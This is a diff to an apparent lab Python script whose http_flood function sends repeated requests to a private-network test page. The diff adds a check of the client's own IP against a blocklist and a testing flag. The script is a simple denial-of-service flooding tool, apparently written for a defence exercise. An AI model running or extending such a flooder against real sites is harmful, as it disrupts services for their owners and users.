@@ -83,6 +83,14 @@ def is_blocked_ip(ip_address):
             return True
 
 def http_flood(target_url, num_of_requests):
+    # Get the client's IP address
+    client_ip = requests.get('https://api.ipify.org').text
+
+    # Check if the client's IP is blocked
+    if is_blocked_ip(client_ip):
+        print(f"Blocking request from suspicious IP: {client_ip}")
+        return
+
     # Flood the webpage with requests
     for _ in range(num_of_requests):
         try:
@@ -102,6 +110,9 @@ def http_flood(target_url, num_of_requests):
 if __name__ == "__main__":
     target_url = "https://10.0.2.15/real-estate-html-template/index.html"
     num_of_requests = 100
+
+    # Set to True for testing w/ protection, False otherwise
+    is_blocked_ip.block_for_testing = True
 
     print(f"Starting http flood, targeting {target_url}")
 
